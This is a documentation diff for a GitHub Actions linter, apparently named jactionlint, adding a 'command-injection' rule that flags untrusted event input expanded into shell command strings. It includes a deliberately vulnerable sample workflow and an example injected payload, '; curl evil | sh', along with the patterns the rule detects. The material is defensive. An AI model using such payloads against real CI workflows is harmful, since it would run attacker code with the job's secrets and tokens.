@@ -41,6 +41,7 @@ List of checks:
 - [Job ID and step ID uniqueness](#check-job-step-ids)
 - [Hardcoded credentials](#check-hardcoded-credentials)
 - [Dangerous writes to `GITHUB_ENV` and `GITHUB_PATH`](#check-github-env)
+- [Input of an outsider that a script runs as code](#check-command-injection)
 - [Writes to the environment files that lose data](#check-environment-file-redirect)
 - [Packages installed by name](#check-adhoc-packages)
 - [Tools installed without an exact version](#check-unpinned-tools)
@@ -2862,6 +2863,76 @@ mention `$env:GITHUB_ENV` or `%GITHUB_ENV%` together with a redirection or `Out-
 
 To turn the rule off, put `github-env: off` in the `rules` section of the [configuration file](config.md) or write
 `# jactionlint ignore=github-env` after a reason.
+
+<a id="check-command-injection"></a>
+## Input of an outsider that a script runs as code
+
+Example input:
+
+```yaml
+on:
+  issue_comment:
+    types: [created]
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - run: bash -c "echo $BODY"
+        env:
+          BODY: ${{ github.event.comment.body }}
+```
+
+Output:
+
+```
+test.yaml:8:14: untrusted input from the variable BODY (github.event.comment.body) is expanded into the command string of "bash -c", which the shell then parses as code: a value with shell syntax (a ;, a quote or $(...)) runs commands in this step. pass the value as an argument of the command string instead (bash -c 'cmd "$1"' _ "$VALUE"), or validate it against a fixed list or a strict pattern first [command-injection]
+  |
+8 |       - run: bash -c "echo $BODY"
+  |              ^~~~~~~~~~~~~~~~~~~~
+```
+
+[Playground](https://jactionlint.jdx.dev/#eNo8zrEKg0AMxvHdp/gQ1/MBbizdO5dSineGatGcmEQQ8d3LVemY/H/Dl9gXQC9i9IppHIk1PwBdJxKPR5ypUWqfxScFySlYP7SHmY3FJfawYKzmhkZJ9JdEaZJDAS5Lj9BIBxdRUuwSqsvtei9PARAv/n8AOXpU24Z3r52FmhZirc+JdUjtin3/DgBUPjhY)
+
+The usual advice for [template injection](#untrusted-inputs) is to pass the input to the script through `env:` and to read it as
+`"$BODY"`. That is safe while the shell only expands the variable, and it is not when the script parses the value again.
+`bash -c "echo $BODY"` builds the command string first and lets a second shell read it, so a comment with `; curl evil | sh` or
+`$(id)` runs commands in the step, with the token and the secrets of the job. The same holds for `eval "$BODY"`, which runs the value
+itself. See CodeQL's [command injection query](https://github.com/github/codeql/blob/main/actions/ql/src/experimental/Security/CWE-078/CommandInjectionCritical.ql).
+
+The rule `command-injection` (in the `default` profile) reports an environment variable or a variable of the script that holds
+input an outsider controls (the same list of inputs as the expression checks, such as `github.event.comment.body`, `github.head_ref`
+or the title of a pull request) when the script:
+
+- runs it with `eval` or `source <(echo "$BODY")`;
+- expands it into the command string of a shell, `bash -c "echo $BODY"`, also behind `sudo`, `docker run image sh -c "..."` and the like;
+- uses it as the name of a command (`$CMD`, `"$CMD" --flag`, or `CMD=$(echo "$BODY" | sed ...); $CMD`);
+- pipes it into a shell (`echo "$BODY" | bash`, `bash <<< "$BODY"`, `bash <(echo "$BODY")`);
+- feeds it to `xargs -I{} sh -c 'echo {}'`, which puts each line into the command string of the shell;
+- expands it into the program text of an inline interpreter (`python -c`, `node -e`, `perl -e`, `ruby -e`).
+
+In the script of `actions/github-script` it reports the calls of `child_process` that go through a shell (`exec`, `execSync`, and `spawn`,
+`execFile` and their sync forms with `shell: true`), a shell started with `-c`, and `exec.exec(...)` when the untrusted value is the
+program that runs. The value comes from `process.env.NAME` (the step, the job or the workflow set `NAME` to an untrusted expression),
+from `context.payload.*` or from a constant of the script that holds one of them. An argument in an array (`execFileSync('git',
+['log', '--grep', value])`, `exec.exec('git', ['checkout', value])`) is data and is not reported.
+
+A plain `"$BODY"` as the argument of a command is not reported (at most that is argument injection), and neither is a value that is
+only expanded: `bash -c 'echo "$1"' _ "$BODY"`, `bash -c 'echo "$BODY"'` and `eval 'echo "$BODY"'` read the value as data. The rule
+also accepts a value that the script made safe first: checked with an anchored pattern before the use
+(`[[ "$BODY" =~ ^[a-z0-9-]+$ ]] || exit 1`), cut down to letters, digits and a few harmless characters (`tr -cd 'a-z0-9'`,
+`${BODY//[^a-z0-9]/}`, `sed 's/[^a-zA-Z0-9]/-/g'`), quoted for the shell (`printf '%q'`, `${BODY@Q}`), or turned into a number or a hash
+(`wc`, `sha256sum`). A value without newlines is not enough here, because `$(id)` has none. In JavaScript the value is accepted when it
+is wrapped in a call (`Number(x)`, `shellQuote(x)`), cleaned with `.replace(...)` or tested with an anchored regular expression
+(`/^[a-z0-9-]+$/.test(x)`) anywhere in the script.
+
+The rule judges variables like `github-env` does (the last assignment decides, a branch counts together with what was before it).
+Three things are left to other rules: an expression written in the script (`eval "${{ github.event.comment.body }}"` is a finding of
+[template-injection](#untrusted-inputs)), `inputs.*` of a composite action (an action can take a command on purpose), and a
+value that only the output of a command makes untrusted. It does not follow a value through a function of the script
+(`run() { eval "$1"; }; run "$BODY"`), and it does not parse scripts of `pwsh`, `cmd` and `python`.
+
+To turn the rule off, put `command-injection: off` in the `rules` section of the [configuration file](config.md) or write
+`# jactionlint ignore=command-injection` after a reason.
 
 <a id="check-environment-file-redirect"></a>
 ## Writes to the environment files that lose data
@@ -8019,7 +8090,7 @@ way because any caller can pass attacker-controlled text. jactionlint does not l
 
 How the rules treat actions:
 
-- **Applies** to the steps (and the metadata) of an action: `action-syntax`, `adhoc-packages`, `archived-uses`, `artipacked`, `background-step-not-waited`, `checkout-static-credentials`, `constant-condition`, `context-availability`, `continue-on-error`, `deprecated-action-input`, `deprecated-commands`, `duplicate-key`, `duplicate-step-id`, `environment-file-redirect`, `expired-ignore`, `expression-syntax`, `expression-type`, `forbidden-uses`, `github-app`, `if-always-true`, `impostor-commit`, `insecure-commands`, `insecure-ssh-keyscan`, `insecure-url-scheme`, `invalid-env-var-name`, `invalid-function-call`, `invalid-id`, `invalid-ignore-comment`, `invalid-local-action`, `invalid-parallel-step`, `invalid-shell-name`, `invalid-uses`, `invisible-characters`, `known-vulnerable-actions`, `max-run-lines`, `merge-key`, `misfeature`, `missing-action-input`, `obfuscation`, `outdated-action-runner`, `pipeline-without-pipefail`, `pyflakes`, `recursive-alias`, `ref-confusion`, `ref-version-mismatch`, `require-expression-wrapping`, `self-repository`, `shellcheck`, `stale-action-refs`, `superfluous-actions`, `template-injection`, `typosquat-uses`, `undefined-function`, `undefined-property`, `unknown-action-input`, `unlocked-install`, `unpinned-images`, `unpinned-tools`, `unpinned-uses`, `unsound-contains`, `unsound-prefix-match`, `unsound-ternary`, `unused-anchor`, `unused-ignore`, `unverified-download`, `use-trusted-publishing`, `yaml-syntax`.
+- **Applies** to the steps (and the metadata) of an action: `action-syntax`, `adhoc-packages`, `archived-uses`, `artipacked`, `background-step-not-waited`, `checkout-static-credentials`, `command-injection`, `constant-condition`, `context-availability`, `continue-on-error`, `deprecated-action-input`, `deprecated-commands`, `duplicate-key`, `duplicate-step-id`, `environment-file-redirect`, `expired-ignore`, `expression-syntax`, `expression-type`, `forbidden-uses`, `github-app`, `if-always-true`, `impostor-commit`, `insecure-commands`, `insecure-ssh-keyscan`, `insecure-url-scheme`, `invalid-env-var-name`, `invalid-function-call`, `invalid-id`, `invalid-ignore-comment`, `invalid-local-action`, `invalid-parallel-step`, `invalid-shell-name`, `invalid-uses`, `invisible-characters`, `known-vulnerable-actions`, `max-run-lines`, `merge-key`, `misfeature`, `missing-action-input`, `obfuscation`, `outdated-action-runner`, `pipeline-without-pipefail`, `pyflakes`, `recursive-alias`, `ref-confusion`, `ref-version-mismatch`, `require-expression-wrapping`, `self-repository`, `shellcheck`, `stale-action-refs`, `superfluous-actions`, `template-injection`, `typosquat-uses`, `undefined-function`, `undefined-property`, `unknown-action-input`, `unlocked-install`, `unpinned-images`, `unpinned-tools`, `unpinned-uses`, `unsound-contains`, `unsound-prefix-match`, `unsound-ternary`, `unused-anchor`, `unused-ignore`, `unverified-download`, `use-trusted-publishing`, `yaml-syntax`.
 - **Caller-dependent**: `agentic-actions`, `bot-conditions`, `cache-poisoning`, `github-env` (its findings about untrusted input do not depend on the caller), `untrusted-artifact` and `untrusted-checkout`.
 - **Not applicable** because an action does not have what the rule checks, or because only the calling job can decide (`unused-baseline-entry` is about the baseline file, not about a workflow or an action): `anonymous-definition`, `concurrency-cancels-prs`, `concurrency-cancels-release`, `concurrency-limits`, `conflicting-runner-labels`, `cron-too-frequent`, `cyclic-job-needs`, `dangerous-triggers`, `dependabot-cooldown`, `dependabot-execution`, `dependabot-missing-actions-update`, `dependabot-syntax`, `duplicate-job-id`, `duplicate-job-needs`, `duplicate-triggers`, `excessive-permissions`, `gate-job-skipped-on-failure`, `gh-without-token`, `hardcoded-container-credentials`, `invalid-activity-type`, `invalid-cron`, `invalid-event-config`, `invalid-event-filter`, `invalid-glob`, `invalid-label-pattern`, `invalid-local-workflow`, `invalid-permissions`, `invalid-timezone`, `invalid-workflow-call`, `invalid-workflow-call-input`, `invalid-workflow-dispatch-input`, `local-action-checkout`, `matrix-duplicate-value`, `matrix-invalid-exclude`, `missing-permissions`, `missing-timeout`, `missing-workflow-input`, `missing-workflow-secret`, `mutable-runner-label`, `overprovisioned-secrets`, `require-shell`, `required-actions`, `secrets-inherit`, `secrets-outside-env`, `self-hosted-runner`, `timeout-too-long`, `undefined-job-needs`, `undocumented-permissions`, `unknown-event`, `unknown-runner-label`, `unknown-workflow-input`, `unknown-workflow-secret`, `unredacted-secrets`, `unused-baseline-entry`, `unused-job-output`, `unused-needs`, `unused-workflow-input`, `workflow-call-permissions`, `workflow-input-type`, `workflow-run-names`, `workflow-secret-scope`, `workflow-syntax`.
 
